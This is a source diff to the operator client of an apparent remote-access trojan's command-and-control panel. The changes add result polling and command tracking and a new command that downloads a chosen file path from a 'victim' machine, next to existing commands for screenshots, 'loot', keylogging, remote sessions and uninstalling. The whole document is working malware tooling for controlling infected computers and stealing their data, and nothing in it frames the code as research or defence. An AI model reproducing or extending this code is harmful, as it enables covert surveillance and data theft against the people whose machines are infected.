@@ -6,6 +6,7 @@
 #include "HttpUtils.hpp"
 #include "LogDAO.hpp"
 #include "LogManager.hpp"
+#include "ResultManager.hpp"
 #include "Util/SafeLogger.hpp"
 #include "SessionManager.hpp"
 #include "Types.hpp"
@@ -18,6 +19,7 @@ Client::Client(const std::string& db_path)
       m_builder(Builder::instance()),
       m_log_man(LogManager::instance()),
       m_cmd_man(CommandManager::instance()),
+      m_result_man(ResultManager::instance()),
       m_vic_man(VictimManager::instance()),
       m_sess_man(SessionManager::instance()),
       m_gateway(""),
@@ -167,7 +169,21 @@ const std::vector<Victim>& Client::getVictims() const {
     return m_vic_man.getVictims();
 }
 
-bool Client::post_victim_command(const UUID& client_id, const std::string& command_text, const char* failure_label) {
+bool Client::fetchResults() {
+    m_gateway.set_credentials(getUsername(), getPassword());
+    return m_result_man.refresh(m_gateway);
+}
+
+bool Client::pollResults() {
+    m_gateway.set_credentials(getUsername(), getPassword());
+    m_result_man.poll_pending(m_gateway, m_cmd_man);
+    return true;
+}
+
+std::optional<UUID> Client::post_victim_command(
+    const UUID& client_id,
+    const std::string& command_text,
+    const char* failure_label) {
     m_gateway.set_credentials(getUsername(), getPassword());
 
     CommandDAO cmd;
@@ -181,13 +197,20 @@ bool Client::post_victim_command(const UUID& client_id, const std::string& comma
     const auto result = m_gateway.post_command(cmd);
     if (!result) {
         m_log_man.local_log(std::format("{}: {}", failure_label, result.error().message));
-        return false;
+        return std::nullopt;
     }
-    return result->id > 0;
+
+    if (result->id > 0) {
+        m_cmd_man.track(cmd.uid, client_id, command_text);
+        m_result_man.track_command_text(cmd.uid, command_text);
+        return cmd.uid;
+    }
+
+    return std::nullopt;
 }
 
 bool Client::sendTimeoutCommand(const UUID& client_id, int timeout) {
-    return post_victim_command(client_id, std::format("timeout {}", timeout), "Sending Timeout Failed");
+    return post_victim_command(client_id, std::format("timeout {}", timeout), "Sending Timeout Failed").has_value();
 }
 
 bool Client::registerTemplate(const std::string& username, const std::string& password) {
@@ -214,31 +237,40 @@ bool Client::sendOpenSessionCommand(const UUID& client_id, int64_t port) {
     return post_victim_command(
         client_id,
         std::format("session {} {}", getServerHost(), port),
-        "Sending Open Session Command Failed");
+        "Sending Open Session Command Failed")
+        .has_value();
 }
 
 bool Client::sendCloseSessionCommand(const UUID& client_id) {
-    return post_victim_command(client_id, "close", "Sending Close Session Command Failed");
+    return post_victim_command(client_id, "close", "Sending Close Session Command Failed").has_value();
 }
 
 bool Client::sendScreenshotCommand(const UUID& client_id) {
-    return post_victim_command(client_id, "screenshot", "Sending Screenshot Command Failed");
+    return post_victim_command(client_id, "screenshot", "Sending Screenshot Command Failed").has_value();
 }
 
 bool Client::sendLootCommand(const UUID& client_id) {
-    return post_victim_command(client_id, "loot", "Sending Loot Command Failed");
+    return post_victim_command(client_id, "loot", "Sending Loot Command Failed").has_value();
+}
+
+bool Client::sendDownloadCommand(const UUID& client_id, const std::string& path) {
+    return post_victim_command(
+        client_id,
+        std::format("download {}", path),
+        "Sending Download Command Failed")
+        .has_value();
 }
 
 bool Client::sendStartKeyloggerCommand(const UUID& client_id) {
-    return post_victim_command(client_id, "keylogger_start", "Sending Keylogger Start Failed");
+    return post_victim_command(client_id, "keylogger_start", "Sending Keylogger Start Failed").has_value();
 }
 
 bool Client::sendStopKeyloggerCommand(const UUID& client_id) {
-    return post_victim_command(client_id, "keylogger_stop", "Sending Keylogger Stop Failed");
+    return post_victim_command(client_id, "keylogger_stop", "Sending Keylogger Stop Failed").has_value();
 }
 
 bool Client::sendUninstallCommand(const UUID& client_id) {
-    return post_victim_command(client_id, "uninstall", "Sending Uninstall Command Failed");
+    return post_victim_command(client_id, "uninstall", "Sending Uninstall Command Failed").has_value();
 }
 
 bool Client::uninstallVictim(const Victim& victim) {
@@ -308,6 +340,10 @@ bool Client::sendScreenshotCommand(int64_t client_id) {
 
 bool Client::sendLootCommand(int64_t client_id) {
     return sendLootCommand(m_vic_man.getVictim(client_id).uid);
+}
+
+bool Client::sendDownloadCommand(int64_t client_id, const std::string& path) {
+    return sendDownloadCommand(m_vic_man.getVictim(client_id).uid, path);
 }
 
 bool Client::sendStartKeyloggerCommand(int64_t client_id) {
